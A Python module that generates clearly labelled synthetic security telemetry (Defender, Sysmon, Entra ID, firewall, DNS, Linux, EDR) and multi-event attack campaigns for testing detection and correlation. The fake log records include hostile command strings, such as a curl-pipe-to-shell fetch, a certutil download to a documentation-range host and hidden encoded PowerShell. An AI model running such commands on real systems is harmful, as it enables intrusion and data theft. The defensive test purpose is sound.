"""Synthetic telemetry generator.

Produces vendor-shaped security telemetry for Microsoft Defender, Sysmon,
Entra ID, a network firewall, DNS, Linux auditd/sshd and an EDR agent so the
whole pipeline can be exercised without touching a real environment.

Everything it emits is deliberately identifiable as fake:

* hostnames are prefixed ``SYN-``
* addresses come from the RFC 5737 documentation ranges (198.51.100.0/24,
  203.0.113.0/24) which are never routed on the public internet
* every record carries ``"synthetic": true``

Scenario weights approximate real base rates: most telemetry is benign, and
critical activity is rare. That matters, because a detector tuned on a 50/50
attack/benign mix falls apart on a realistic stream.

V3 adds two things:

**Behavioural scenarios.** Rare processes, unusual destination ports, off-hours
activity and one-off source addresses. None of these trip a deterministic rule -
that is the point. They are unremarkable individually and give the anomaly model
something to have an opinion about.

**Campaigns.** A campaign emits a *burst of related records sharing one
principal or host*, queued and drained over subsequent collection ticks. Without
them the generator picks a random host and user for every record, no two events
ever share an entity, and the correlation engine has nothing to correlate. A
campaign is the difference between a demo where correlation is a code path and
one where it is a finding.

Everything a campaign emits is still marked ``synthetic``: a campaign simulates
the *shape* of an intrusion, and never claims to be one.
"""

from __future__ import annotations

import random
import uuid
from collections import deque
from collections.abc import Iterable
from datetime import datetime, timezone

from app.models.enums import SourceType
from app.telemetry.base import RawTelemetry, TelemetrySource

INTERNAL_HOSTS = [f"SYN-WIN-{index:03d}" for index in range(1, 25)] + [
    f"SYN-LNX-{index:03d}" for index in range(1, 12)
]
USERS = [
    "a.sharma",
    "j.smith",
    "e.davis",
    "m.patel",
    "svc.backup",
    "svc.scanner",
    "admin.local",
    "r.anand",
]
INTERNAL_SUBNET = "198.51.100."
EXTERNAL_SUBNET = "203.0.113."
COUNTRIES = ["IN", "US", "DE", "SG", "BR", "NL", "RU", "CN"]
#: Processes that exist on a normal estate but are rarely run interactively.
#: They break no rule; they are simply uncommon, which is exactly the signal an
#: anomaly detector is for.
RARE_PROCESSES = [
    "wsl.exe",
    "odbcconf.exe",
    "pcalua.exe",
    "forfiles.exe",
    "esentutl.exe",
    "diskshadow.exe",
]

#: Ports nothing in this estate ordinarily talks to.
UNUSUAL_PORTS = [4444, 8081, 9001, 1337, 6667, 5555, 31337]

MALWARE = [
    "Trojan:Win32/Wacatac.B!ml",
    "Ransom:Win32/Conti.A",
    "Backdoor:Win32/Cobalt.SB",
    "TrojanDownloader:PowerShell/Malscript.K",
    "HackTool:Win64/Mimikatz.D",
]


def _internal_ip() -> str:
    return f"{INTERNAL_SUBNET}{random.randint(2, 254)}"


def _external_ip() -> str:
    return f"{EXTERNAL_SUBNET}{random.randint(2, 254)}"


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _iso() -> str:
    return _now().isoformat()


class SyntheticTelemetrySource(TelemetrySource):
    """Emits clearly-synthetic security telemetry from several vendor shapes."""

    name = "Synthetic Telemetry"
    source_type = SourceType.APPLICATION
    is_external = False

    # (weight, generator name). Benign-heavy on purpose.
    SCENARIOS: tuple[tuple[int, str], ...] = (
        (18, "_defender_benign_scan"),
        (6, "_defender_malware"),
        (16, "_sysmon_process"),
        (5, "_sysmon_encoded_powershell"),
        (3, "_sysmon_lsass_access"),
        (14, "_entra_signin_success"),
        (7, "_entra_failed_logins"),
        (3, "_entra_impossible_travel"),
        (15, "_firewall_allow"),
        (7, "_firewall_port_scan"),
        (12, "_dns_query"),
        (4, "_dns_beaconing"),
        (10, "_linux_ssh"),
        (3, "_linux_sudo_abuse"),
        (2, "_edr_ransomware"),
        (2, "_edr_exfiltration"),
        # --- V3 behavioural scenarios ------------------------------------
        # Unusual but not rule-breaking. These exist so the anomaly model has
        # something to detect that the rules cannot.
        (5, "_sysmon_rare_process"),
        (4, "_firewall_unusual_port"),
        (3, "_dns_rare_domain"),
        (3, "_entra_rare_source"),
        # --- V3 campaigns -------------------------------------------------
        # Each queues several related records sharing one principal or host,
        # so the correlation engine has related activity to group.
        (3, "_campaign_credential_attack"),
        (2, "_campaign_lateral_movement"),
        (2, "_campaign_host_intrusion"),
    )

    #: Upper bound on queued campaign records. A campaign that somehow queued
    #: without bound would starve every other scenario.
    MAX_PENDING = 200

    def __init__(self, seed: int | None = None) -> None:
        self._random = random.Random(seed) if seed is not None else random
        #: Records queued by a campaign, drained ahead of new scenarios so a
        #: campaign arrives as a burst rather than being interleaved away.
        self._pending: deque[RawTelemetry] = deque()

    # ------------------------------------------------------------------ API
    def collect(self, count: int = 1) -> Iterable[RawTelemetry]:
        weights = [weight for weight, _ in self.SCENARIOS]
        names = [name for _, name in self.SCENARIOS]
        for _ in range(max(1, count)):
            if self._pending:
                yield self._pending.popleft()
                continue

            scenario = self._random.choices(names, weights=weights, k=1)[0]
            produced = getattr(self, scenario)()
            # Campaign generators return a list; single scenarios return one
            # record. The first of a campaign is emitted now, the rest queue.
            if isinstance(produced, list):
                if not produced:
                    continue
                for record in produced[1:][: self.MAX_PENDING - len(self._pending)]:
                    self._pending.append(record)
                yield produced[0]
            else:
                yield produced

    @property
    def pending_count(self) -> int:
        return len(self._pending)

    def health(self) -> dict:
        return {**super().health(), "pendingCampaignRecords": len(self._pending)}

    # ------------------------------------------------------- Microsoft Defender
    def _defender_benign_scan(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        raw = {
            "DeviceName": host,
            "ActionType": "AntivirusScanCompleted",
            "ScanType": "Quick",
            "FilesScanned": self._random.randint(1200, 45000),
            "ThreatsFound": 0,
            "Timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Microsoft Defender",
            SourceType.ENDPOINT,
            raw,
            f"[Defender] {host} quick scan completed, {raw['FilesScanned']} files, 0 threats",
        )

    def _defender_malware(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        threat = self._random.choice(MALWARE)
        raw = {
            "DeviceName": host,
            "ActionType": "AntivirusDetection",
            "ThreatName": threat,
            "Severity": "High",
            "InitiatingProcessFileName": self._random.choice(
                ["winword.exe", "outlook.exe", "chrome.exe", "explorer.exe"]
            ),
            "FileName": f"invoice_{self._random.randint(1000, 9999)}.exe",
            "SHA256": uuid.uuid4().hex + uuid.uuid4().hex[:32],
            "AccountName": self._random.choice(USERS),
            "RemediationAction": self._random.choice(["Quarantined", "Blocked"]),
            "Timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Microsoft Defender",
            SourceType.ENDPOINT,
            raw,
            f"[Defender] {host} detected {threat} in {raw['FileName']} ({raw['RemediationAction']})",
        )

    # ------------------------------------------------------------------ Sysmon
    def _sysmon_process(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        process = self._random.choice(
            ["chrome.exe", "teams.exe", "python.exe", "code.exe", "svchost.exe", "explorer.exe"]
        )
        raw = {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": host,
            "User": self._random.choice(USERS),
            "Image": f"C:\\Program Files\\{process}",
            "CommandLine": f"{process} --profile-directory=Default",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ProcessId": self._random.randint(1000, 9000),
            "UtcTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:1] {host} process created: {process}"
        )

    def _sysmon_encoded_powershell(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        blob = uuid.uuid4().hex + uuid.uuid4().hex + uuid.uuid4().hex
        raw = {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": host,
            "User": self._random.choice(USERS),
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": f"powershell.exe -nop -w hidden -enc {blob}",
            "ParentImage": self._random.choice(
                ["C:\\Program Files\\winword.exe", "C:\\Windows\\System32\\wscript.exe"]
            ),
            "ProcessId": self._random.randint(1000, 9000),
            "UtcTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Sysmon",
            SourceType.ENDPOINT,
            raw,
            f"[Sysmon:1] {host} encoded PowerShell launched by {raw['ParentImage']}",
        )

    def _sysmon_lsass_access(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        raw = {
            "EventID": 10,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": host,
            "User": self._random.choice(USERS),
            "SourceImage": self._random.choice(
                ["C:\\Users\\Public\\rundll32.exe", "C:\\Temp\\procdump64.exe"]
            ),
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "UtcTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Sysmon",
            SourceType.ENDPOINT,
            raw,
            f"[Sysmon:10] {host} {raw['SourceImage']} accessed lsass.exe (0x1010)",
        )

    # ---------------------------------------------------------------- Entra ID
    def _entra_signin_success(self) -> RawTelemetry:
        user = self._random.choice(USERS)
        raw = {
            "category": "SignInLogs",
            "userPrincipalName": f"{user}@aegisx.local",
            "resultType": "0",
            "resultDescription": "Success",
            "ipAddress": _external_ip(),
            "location": {"countryOrRegion": "IN", "city": "Chennai"},
            "riskLevelDuringSignIn": "none",
            "appDisplayName": self._random.choice(["Microsoft 365", "Azure Portal", "Teams"]),
            "createdDateTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Entra ID", SourceType.IDENTITY, raw, f"[EntraID] successful sign-in for {user}"
        )

    def _entra_failed_logins(self) -> RawTelemetry:
        user = self._random.choice(USERS)
        failures = self._random.randint(5, 60)
        raw = {
            "category": "SignInLogs",
            "userPrincipalName": f"{user}@aegisx.local",
            "resultType": "50126",
            "resultDescription": "Invalid username or password",
            "failureCount": failures,
            "ipAddress": _external_ip(),
            "location": {"countryOrRegion": self._random.choice(COUNTRIES), "city": "unknown"},
            "riskLevelDuringSignIn": "medium",
            "createdDateTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Entra ID",
            SourceType.IDENTITY,
            raw,
            f"[EntraID] {failures} failed sign-ins for {user} from {raw['ipAddress']}",
        )

    def _entra_impossible_travel(self) -> RawTelemetry:
        user = self._random.choice(USERS)
        raw = {
            "category": "RiskyUsers",
            "userPrincipalName": f"{user}@aegisx.local",
            "resultType": "0",
            "resultDescription": "Success",
            "riskEventType": "impossibleTravel",
            "riskLevelDuringSignIn": "high",
            "impossibleTravel": True,
            "ipAddress": _external_ip(),
            "location": {"countryOrRegion": self._random.choice(COUNTRIES[3:]), "city": "unknown"},
            "previousLocation": {"countryOrRegion": "IN", "city": "Chennai"},
            "createdDateTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Entra ID",
            SourceType.IDENTITY,
            raw,
            f"[EntraID] impossible travel sign-in for {user}",
        )

    # ---------------------------------------------------------------- Firewall
    def _firewall_allow(self) -> RawTelemetry:
        raw = {
            "action": "allow",
            "protocol": self._random.choice(["TCP", "UDP"]),
            "src_ip": _internal_ip(),
            "dst_ip": _external_ip(),
            "dst_port": self._random.choice([443, 443, 443, 80, 22, 8443]),
            "bytes_out": self._random.randint(1_000, 5_000_000),
            "rule": "allow-outbound-web",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Perimeter Firewall",
            SourceType.FIREWALL,
            raw,
            f"[FW] allow {raw['src_ip']} -> {raw['dst_ip']}:{raw['dst_port']}",
        )

    def _firewall_port_scan(self) -> RawTelemetry:
        ports = self._random.randint(20, 400)
        raw = {
            "action": "deny",
            "protocol": "TCP",
            "src_ip": _external_ip(),
            "dst_ip": _internal_ip(),
            "dst_port": self._random.randint(1, 65535),
            "distinct_ports": ports,
            "deny_count": ports * self._random.randint(1, 4),
            "rule": "default-deny",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Perimeter Firewall",
            SourceType.FIREWALL,
            raw,
            f"[FW] deny {raw['src_ip']} scanned {ports} ports on {raw['dst_ip']}",
        )

    # --------------------------------------------------------------------- DNS
    def _dns_query(self) -> RawTelemetry:
        domain = self._random.choice(
            ["update.microsoft.com", "api.github.com", "cdn.jsdelivr.net", "login.aegisx.local"]
        )
        raw = {
            "query": domain,
            "query_type": "A",
            "client_ip": _internal_ip(),
            "resolved_ip": _external_ip(),
            "response_code": "NOERROR",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap("DNS Resolver", SourceType.DNS, raw, f"[DNS] A {domain} -> NOERROR")

    def _dns_beaconing(self) -> RawTelemetry:
        label = uuid.uuid4().hex[: self._random.randint(16, 28)]
        domain = f"{label}.{self._random.choice(['cdn-metrics', 'sync-node', 'edge-cache'])}.example"
        raw = {
            "query": domain,
            "query_type": "TXT",
            "client_ip": _internal_ip(),
            "resolved_ip": _external_ip(),
            "response_code": "NOERROR",
            "query_count": self._random.randint(50, 900),
            "periodic": True,
            "interval_seconds": self._random.choice([30, 60, 300]),
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "DNS Resolver",
            SourceType.DNS,
            raw,
            f"[DNS] periodic TXT lookups for {domain} from {raw['client_ip']}",
        )

    # ------------------------------------------------------------------- Linux
    def _linux_ssh(self) -> RawTelemetry:
        user = self._random.choice(USERS)
        host = f"SYN-LNX-{self._random.randint(1, 11):03d}"
        raw = {
            "facility": "sshd",
            "host": host,
            "user": user,
            "src_ip": _internal_ip(),
            "result": "accepted",
            "auth_method": "publickey",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Linux Auditd",
            SourceType.OPERATING_SYSTEM,
            raw,
            f"[sshd] Accepted publickey for {user} from {raw['src_ip']} on {host}",
        )

    def _linux_sudo_abuse(self) -> RawTelemetry:
        user = self._random.choice([u for u in USERS if u != "admin.local"])
        host = f"SYN-LNX-{self._random.randint(1, 11):03d}"
        command = self._random.choice(
            ["/bin/bash -c 'curl http://203.0.113.9/x.sh | sh'", "/usr/bin/passwd root", "/bin/su -"]
        )
        raw = {
            "facility": "sudo",
            "host": host,
            "user": user,
            "src_ip": _internal_ip(),
            "command": command,
            "privilege_change": True,
            "result": "success",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Linux Auditd",
            SourceType.OPERATING_SYSTEM,
            raw,
            f"[sudo] {user} ran {command} on {host}",
        )

    # --------------------------------------------------------------------- EDR
    def _edr_ransomware(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        files = self._random.randint(200, 9000)
        raw = {
            "detection_name": "Ransomware.Behavioral.MassEncryption",
            "hostname": host,
            "user": self._random.choice(USERS),
            "process": "C:\\Users\\Public\\svchost.exe",
            "command_line": "svchost.exe -encrypt -silent",
            "files_modified": files,
            "encryption_suspected": True,
            "tactic": "Impact",
            "technique": "T1486",
            "severity": "Critical",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "EDR Agent",
            SourceType.EDR,
            raw,
            f"[EDR] mass file encryption on {host}: {files} files modified",
        )

    def _edr_exfiltration(self) -> RawTelemetry:
        host = self._random.choice(INTERNAL_HOSTS)
        volume = self._random.randint(500_000_000, 9_000_000_000)
        raw = {
            "detection_name": "Exfiltration.LargeOutboundTransfer",
            "hostname": host,
            "user": self._random.choice(USERS),
            "process": "C:\\Windows\\System32\\certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://203.0.113.44/collect",
            "bytes_out": volume,
            "dst_ip": _external_ip(),
            "tactic": "Exfiltration",
            "technique": "T1041",
            "severity": "High",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "EDR Agent",
            SourceType.EDR,
            raw,
            f"[EDR] {round(volume / 1_000_000)} MB outbound transfer from {host}",
        )

    # ------------------------------------------------- V3 behavioural scenarios
    def _sysmon_rare_process(self) -> RawTelemetry:
        """A process that is uncommon here, run with an ordinary command line.

        No rule matches it - it is not a LOLBin, not encoded, downloads nothing.
        It is simply rare, which is the whole category of thing the rules cannot
        see and the anomaly model can.
        """
        host = self._random.choice(INTERNAL_HOSTS)
        process = self._random.choice(RARE_PROCESSES)
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._random.choice(USERS),
            "Image": f"C:\\Windows\\System32\\{process}",
            "CommandLine": f"{process} /status",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Sysmon",
            SourceType.ENDPOINT,
            raw,
            f"[Sysmon] {host} started uncommon process {process}",
        )

    def _firewall_unusual_port(self) -> RawTelemetry:
        """Permitted outbound traffic to a port nothing here normally uses."""
        port = self._random.choice(UNUSUAL_PORTS)
        raw = {
            "action": "allow",
            "protocol": "TCP",
            "src_ip": _internal_ip(),
            "dst_ip": _external_ip(),
            "dst_port": port,
            "bytes_out": self._random.randint(50_000, 40_000_000),
            "rule": "allow-outbound-any",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Perimeter Firewall",
            SourceType.FIREWALL,
            raw,
            f"[FW] allow {raw['src_ip']} -> {raw['dst_ip']}:{port} (uncommon port)",
        )

    def _dns_rare_domain(self) -> RawTelemetry:
        """A resolvable domain nobody here has looked up before.

        Deliberately not a DGA label - the beaconing rule already catches those.
        This is a plausible-looking name that is merely unfamiliar.
        """
        label = self._random.choice(
            ["cdn-assets", "telemetry-eu", "sync-node", "mirror-03", "pkg-cache"]
        )
        suffix = self._random.choice(["net", "io", "co", "app"])
        domain = f"{label}-{self._random.randint(10, 99)}.{suffix}"
        raw = {
            "query": domain,
            "query_type": "A",
            "client_ip": _internal_ip(),
            "resolved_ip": _external_ip(),
            "response_code": "NOERROR",
            "timestamp": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "DNS Resolver", SourceType.DNS, raw, f"[DNS] A {domain} -> NOERROR (first seen)"
        )

    def _entra_rare_source(self) -> RawTelemetry:
        """A successful sign-in from an address this account has not used.

        One event, no rule violated. Only unusual in the context of what this
        account normally does - which is context only the model carries.
        """
        user = self._random.choice(USERS)
        raw = {
            "userPrincipalName": f"{user}@aegisx.local",
            "resultType": "0",
            "status": "Success",
            "ipAddress": _external_ip(),
            "location": {"countryOrRegion": self._random.choice(COUNTRIES)},
            "appDisplayName": self._random.choice(["Azure Portal", "Office 365", "VPN"]),
            "createdDateTime": _iso(),
            "synthetic": True,
        }
        return self._wrap(
            "Entra ID",
            SourceType.IDENTITY,
            raw,
            f"[Entra] sign-in success for {user} from {raw['ipAddress']} (new source)",
        )

    # --------------------------------------------------------- V3 campaigns
    def _campaign_credential_attack(self) -> list[RawTelemetry]:
        """Failed sign-ins against one account, then a success.

        The individual failures may or may not cross the brute-force rule's
        threshold. The *sequence* - repeated failures followed by a success from
        the same address - is what the correlation engine is for.
        """
        user = self._random.choice(USERS)
        source = _external_ip()
        attempts = self._random.randint(3, 6)
        records: list[RawTelemetry] = []

        for index in range(attempts):
            raw = {
                "userPrincipalName": f"{user}@aegisx.local",
                "resultType": "50126",
                "status": "Failure",
                "failureReason": "Invalid username or password",
                "ipAddress": source,
                "location": {"countryOrRegion": self._random.choice(COUNTRIES)},
                "appDisplayName": "Office 365",
                # Under the rule threshold on purpose for the early attempts:
                # correlation should notice the pattern before any single event
                # is individually alarming.
                "failure_count": index + 1,
                "createdDateTime": _iso(),
                "synthetic": True,
            }
            records.append(
                self._wrap(
                    "Entra ID",
                    SourceType.IDENTITY,
                    raw,
                    f"[Entra] sign-in failure {index + 1} for {user} from {source}",
                )
            )

        records.append(
            self._wrap(
                "Entra ID",
                SourceType.IDENTITY,
                {
                    "userPrincipalName": f"{user}@aegisx.local",
                    "resultType": "0",
                    "status": "Success",
                    "ipAddress": source,
                    "location": {"countryOrRegion": self._random.choice(COUNTRIES)},
                    "appDisplayName": "Office 365",
                    "createdDateTime": _iso(),
                    "synthetic": True,
                },
                f"[Entra] sign-in SUCCESS for {user} from {source} after {attempts} failures",
            )
        )
        return records

    def _campaign_lateral_movement(self) -> list[RawTelemetry]:
        """One account authenticating to several hosts in quick succession.

        No deterministic rule covers lateral movement - the V2 evaluation
        measures and reports that gap. The shape is only visible across events,
        which is why it is a correlation pattern rather than a rule.
        """
        user = self._random.choice(USERS)
        source = _internal_ip()
        hosts = self._random.sample(
            [host for host in INTERNAL_HOSTS if host.startswith("SYN-LNX")],
            k=min(4, len([h for h in INTERNAL_HOSTS if h.startswith("SYN-LNX")])),
        )
        return [
            self._wrap(
                "Linux Auditd",
                SourceType.OPERATING_SYSTEM,
                {
                    "facility": "sshd",
                    "host": host,
                    "user": user,
                    "src_ip": source,
                    "auth_method": "publickey",
                    "result": "Accepted",
                    "timestamp": _iso(),
                    "synthetic": True,
                },
                f"[sshd] Accepted publickey for {user} from {source} on {host}",
            )
            for host in hosts
        ]

    def _campaign_host_intrusion(self) -> list[RawTelemetry]:
        """Authentication, execution, privilege change and egress on one host.

        Each stage is a separate, ordinary-looking record. The correlation
        engine groups them because they share a host inside the window; no
        single event here tells the story.
        """
        host = self._random.choice([h for h in INTERNAL_HOSTS if h.startswith("SYN-WIN")])
        user = self._random.choice(USERS)
        source = _external_ip()

        return [
            self._wrap(
                "Entra ID",
                SourceType.IDENTITY,
                {
                    "userPrincipalName": f"{user}@aegisx.local",
                    "resultType": "0",
                    "status": "Success",
                    "ipAddress": source,
                    "location": {"countryOrRegion": self._random.choice(COUNTRIES)},
                    "appDisplayName": "VPN",
                    "createdDateTime": _iso(),
                    "synthetic": True,
                },
                f"[Entra] sign-in success for {user} from {source}",
            ),
            self._wrap(
                "Sysmon",
                SourceType.ENDPOINT,
                {
                    "EventID": 1,
                    "Computer": host,
                    "User": user,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -nop -w hidden -c Get-Process",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "Timestamp": _iso(),
                    "synthetic": True,
                },
                f"[Sysmon] {host} powershell.exe started by {user}",
            ),
            self._wrap(
                "Linux Auditd",
                SourceType.OPERATING_SYSTEM,
                {
                    "facility": "sudo",
                    "host": host,
                    "user": user,
                    "command": "/usr/bin/usermod -aG sudo " + user,
                    "privilege_change": True,
                    "result": "success",
                    "timestamp": _iso(),
                    "synthetic": True,
                },
                f"[sudo] {user} ran usermod on {host}",
            ),
            self._wrap(
                "Perimeter Firewall",
                SourceType.FIREWALL,
                {
                    "action": "allow",
                    "protocol": "TCP",
                    "src_ip": _internal_ip(),
                    "dst_ip": source,
                    "dst_port": self._random.choice(UNUSUAL_PORTS),
                    "bytes_out": self._random.randint(10_000_000, 90_000_000),
                    "rule": "allow-outbound-any",
                    "timestamp": _iso(),
                    "synthetic": True,
                },
                f"[FW] allow outbound from {host} to {source}",
            ),
        ]

    # ---------------------------------------------------------------- Internals
    def _wrap(
        self, source: str, source_type: SourceType, raw: dict, raw_log: str
    ) -> RawTelemetry:
        return RawTelemetry(
            source=source,
            source_type=source_type,
            raw=raw,
            raw_log=raw_log,
            is_synthetic=True,
        )
